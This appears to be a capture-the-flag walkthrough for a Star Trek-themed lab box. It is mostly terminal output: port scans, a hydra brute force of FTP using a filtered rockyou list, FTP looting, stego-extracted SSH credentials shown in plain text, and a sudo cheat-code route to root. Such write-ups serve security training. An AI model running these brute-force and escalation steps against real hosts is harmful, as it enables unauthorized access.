@@ -1,0 +1,291 @@
+if you initially start a scan it will only show port 80
+[ terra2 ~/Desktop ]# rustscan -a ip
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Nmap? More like slowmap.🐢
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open ip:80
+[~] Starting Script(s)
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 21:20 UTC
+Initiating Ping Scan at 21:20
+Scanning ip [4 ports]
+Completed Ping Scan at 21:20, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:20
+Completed Parallel DNS resolution of 1 host. at 21:20, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 21:20
+Scanning ip [1 port]
+Discovered open port 80/tcp on ip
+Completed SYN Stealth Scan at 21:20, 0.05s elapsed (1 total ports)
+Nmap scan report for ip
+Host is up, received echo-reply ttl 63 (0.037s latency).
+Scanned at 2022-08-30 21:20:28 UTC for 0s
+
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
+           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
+
+if you open up the ip in the browser and inspect
+
+<!-- /bridgepnaepinepnibitb8qur8fure0g -->
+
+if you then open this link up you will find a button named "shutdown shields"
+
+when you click it and scan again you will see that the firewall is down now
+but dont miss the comment in the page showing up:
+Btw spock wouldn't it be logic to change your password to something less obvious??? This NCC serial Numbers are boring! 
+[ terra2 ~/Desktop ]# rustscan -a ip
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+🌍HACK THE PLANET🌍
+
+[~] The config file is expected to be at "/root/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open ip:21
+Open ip:80
+Open ip:1337
+Open ip:2222
+[~] Starting Script(s)
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 21:24 UTC
+Initiating Ping Scan at 21:24
+Scanning ip [4 ports]
+Completed Ping Scan at 21:24, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:24
+Completed Parallel DNS resolution of 1 host. at 21:24, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 21:24
+Scanning ip [4 ports]
+Discovered open port 80/tcp on ip
+Discovered open port 21/tcp on ip
+Discovered open port 1337/tcp on ip
+Discovered open port 2222/tcp on ip
+Completed SYN Stealth Scan at 21:24, 0.05s elapsed (4 total ports)
+Nmap scan report for ip
+Host is up, received echo-reply ttl 63 (0.042s latency).
+Scanned at 2022-08-30 21:24:15 UTC for 0s
+
+PORT     STATE SERVICE      REASON
+21/tcp   open  ftp          syn-ack ttl 63
+80/tcp   open  http         syn-ack ttl 63
+1337/tcp open  waste        syn-ack ttl 63
+2222/tcp open  EtherNetIP-1 syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
+           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
+
+if you read the comment you know that spock propably got a password with NCC in it so you can grep for that from rockyou.txt
+and bruteforce your way into ftp
+cat /usr/share/wordlists/rockyou.txt | grep NCC > passwds
+[ terra2 ~ ]# cat passwds | wc -c
+514
+there are only 514 possible passwords left
+[ terra2 ~ ]# hydra -l spock -P /root/passwds ip ftp
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-30 21:29:53
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 54 login tries (l:1/p:54), ~4 tries per task
+[DATA] attacking ftp://ip:21/
+[21][ftp] host: ip   login: spock   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 7 final worker threads did not complete until end.
+[ERROR] 7 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-30 21:30:00
+
+then you can just login to ftp with this creds
+[ terra2 ~ ]# ftp ip
+Connected to ip.
+220 Welcome to spocks personal storage
+Name (ip:root): spock
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Jul 26 15:48 .
+drwxr-xr-x    3 0        0            4096 Jul 26 15:48 ..
+drwxr-xr-x    2 0        0            4096 Jul 26 15:49 .n
+-rw-r--r--    1 0        0          336179 Jul 25 10:54 spock.png
+226 Directory send OK.
+ftp> get spock.png
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for spock.png (336179 bytes).
+226 Transfer complete.
+336179 bytes received in 0.362 seconds (907 kbytes/s)
+ftp> cd .n
+250 Directory successfully changed.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 26 15:49 .
+drwxr-xr-x    3 0        0            4096 Jul 26 15:48 ..
+-rw-r--r--    1 0        0              42 Jul 25 11:03 .note
+-rw-r--r--    1 0        0              41 Jul 25 21:33 flag
+lrwxrwxrwx    1 0        0              12 Jul 26 15:49 lol -> /dev/urandom
+226 Directory send OK.
+ftp> get flag
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for flag (41 bytes).
+226 Transfer complete.
+41 bytes received in 5.7e-05 seconds (702 kbytes/s)
+ftp> get .note
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .note (42 bytes).
+226 Transfer complete.
+42 bytes received in 3.5e-05 seconds (1.14 Mbytes/s)
+ftp>
+so we got the first flag a note and an image
+when you put the note into cyberchef and decode it with rot47 you get this url
+https://stylesuxx.github.io/steganography/
+with this you can extract the stego from spock.png
+kirk:GCTTCTBV
+
+Trip to Codis Mu IV concerning the Tavad
+
+you can just ssh in with this creds
+[ terra2 ~ ]# ssh kirk@ip -p 1337
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[ip]:1337' (ED25519) to the list of known hosts.
+kirk@ip's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 30 Aug 2022 09:39:31 PM UTC
+
+  System load:  0.0               Processes:             115
+  Usage of /:   31.4% of 8.87GB   Users logged in:       0
+  Memory usage: 26%               IPv4 address for eth0: ip
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Jul 27 17:01:10 2022
+kirk@enterprise:~$ ls -la
+total 48
+drwxr-xr-x 6 kirk kirk 4096 Jul 26 19:24 .
+drwxr-xr-x 4 root root 4096 Jul 26 15:01 ..
+-rw------- 1 kirk kirk   19 Jul 26 15:33 .bash_history
+-rw-r--r-- 1 kirk kirk  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 kirk kirk 3771 Feb 25  2020 .bashrc
+drwx------ 2 kirk kirk 4096 Jul 26 14:56 .cache
+-rw-r--r-- 1 root root  399 Jul 26 19:24 .hint
+drwxrwxr-x 3 kirk kirk 4096 Jul 26 17:05 .local
+-rw-r--r-- 1 kirk kirk  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 kirk kirk   66 Jul 26 17:05 .selected_editor
+drwx------ 2 kirk kirk 4096 Jul 26 16:59 .ssh
+-rw-r--r-- 1 kirk kirk    0 Jul 26 14:56 .sudo_as_admin_successful
+drwxr-xr-x 2 root root 4096 Jul 26 15:40 .V
+kirk@enterprise:~$ cat .hint 
+not a hint
+
+nothing here..................................................................................................................................................................................................................... unless a Crystal Shard .......................
+
+kirk@enterprise:~$ sudo -l
+[sudo] password for kirk: 
+Matching Defaults entries for kirk on enterprise:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User kirk may run the following commands on enterprise:
+    (root) /usr/bin/python3 /home/kirk/.V/victory.py
+kirk@enterprise:~$ sudo /usr/bin/python3 /home/kirk/.V/victory.py
+Enter Code: 1234
+OOPS not the right code!
+kirk@enterprise:~$ cat -v .hint 
+not a hint
+
+Ever heard of Star Trek - The Next Generation: Future's Past, There are a bunch of Cheatcodes to reach root!
+^[[2Anothing here..................................................................................................................................................................................................................... unless a Crystal Shard .......................
+so if we just google for "Trip to Codis Mu IV concerning the Tavad" from the last hint or the password of kirk or
+"Star Trek - The Next Generation: Future's Past" we will get a list of cheatcodes
+the hint also says that we can get root via a cheatcode and it mentioned a crystalshard
+so there are only three cheatcodes left:
+Crystal Shard 1 	L[REDACTED]V
+Crystal Shard 2 	M[REDACTED]V
+Crystal Shard 3 	N[REDACTED]B
+so if we just try them all out we get the root password:
+kirk@enterprise:~$ sudo /usr/bin/python3 /home/kirk/.V/victory.py
+Enter Code: [REDACTED]        
+Here is your Crystal Shard!
+Things are impossible until they are not! - Jean Luc Picard
+root:[REDACTED]
+so from here we can just switch to root and search for the other flags
+kirk@enterprise:~$ su root
+Password: 
+root@enterprise:/home/kirk#
+
+if you want to see how many people fell for the /admin site just visit this link: https://rr.noordstar.me/data/985ab526
+
+IF YOU WANT TO FIND THE OTHER FLAGS ON YOUR OWN STOP HERE
+_________________________________________________________
+
+
+root@enterprise:/home/kirk# ls -la .ssh/
+total 16
+drwx------ 2 kirk kirk 4096 Jul 26 16:59 .
+drwxr-xr-x 6 kirk kirk 4096 Jul 26 19:24 ..
+-rw------- 1 kirk kirk    0 Jul 26 14:53 authorized_keys
+-rw-r--r-- 1 root root   45 Jul 25 21:34 .flag
+-rw-r--r-- 1 kirk kirk  222 Jul 26 16:59 known_hosts
+root@enterprise:/home/kirk# cat .ssh/.flag
+root@enterprise:/var/www# ls -la
+total 24
+drwxr-xr-x  4 root root 4096 Jul 26 15:48 .
+drwxr-xr-x 14 root root 4096 Jul 26 15:42 ..
+-rw-r--r--  1 root root   43 Jul 25 21:35 .flag
+drwxr-xr-x  2 root root 4096 Jul 26 15:43 static
+drwxr-xr-x  2 root root 4096 Jul 26 15:44 templates
+-rw-r--r--  1 root root  757 Jul 25 20:15 web.py
+root@enterprise:/var/www# cd /root
+root@enterprise:~# ls -la
+total 48
+drwx------  6 root root 4096 Jul 26 17:17 .
+drwxr-xr-x 19 root root 4096 Jul 26 14:52 ..
+-rw-------  1 root root   10 Jul 26 16:01 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwxr-xr-x  3 root root 4096 Jul 26 17:17 .cache
+drwxr-xr-x  3 root root 4096 Jul 26 15:00 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r--r--  1 root root   37 Jul 21 20:01 .root
+lrwxrwxrwx  1 root root   12 Jul 26 15:52 root.txt -> /dev/urandom
+-rw-r--r--  1 root root   38 Jul 25 20:07 see_how_many_skiddies_tried_to_solve_this_box
+-rw-r--r--  1 root root   66 Jul 26 15:45 .selected_editor
+drwx------  3 root root 4096 Jul 26 14:53 snap
+drwx------  2 root root 4096 Jul 26 15:20 .ssh
